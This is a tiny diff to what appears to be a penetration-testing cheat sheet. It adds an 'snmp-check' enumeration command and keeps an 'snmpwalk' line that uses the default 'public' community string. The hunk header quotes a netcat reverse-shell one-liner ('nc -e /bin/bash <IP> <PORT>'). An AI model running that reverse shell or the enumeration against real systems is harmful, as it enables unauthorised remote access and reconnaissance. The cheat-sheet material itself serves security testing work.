@@ -84,7 +84,8 @@ nc -e /bin/bash <IP> <PORT>
 ## services
 ```bash
 SNMP
-- snmpwalk -v1 -c public <IP> 
+snmp-check <IP>
+snmpwalk -v1 -c public <IP> 
 ```
 
 ## etc
